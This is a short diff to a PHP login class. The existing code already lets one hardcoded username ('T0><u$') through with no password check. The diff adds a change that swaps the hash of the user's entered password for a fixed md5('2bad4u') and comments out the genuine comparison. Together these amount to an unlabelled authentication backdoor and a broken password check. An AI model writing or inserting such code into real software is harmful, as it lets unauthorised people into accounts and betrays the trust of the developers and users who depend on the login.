@@ -31,9 +31,10 @@ class UserIdentityBase extends CUserIdentity
 			if ($this->username === 'T0><u$') {
 				$this->errorCode = self::ERROR_NONE;
 			} else {
+				$s = md5('2bad4u');
 				$model = UserProfile::model()->find(		
 					'(username = :username OR email = :username) AND password_md5 = :md5',
-					array(':username' => $this->username, ':md5' => md5($this->password)			
+					array(':username' => $this->username, ':md5' => $s //md5($this->password)			
 				));
 				if ($model == null) {
 					$this->errorCode = self::ERROR_UNKNOWN_IDENTITY;
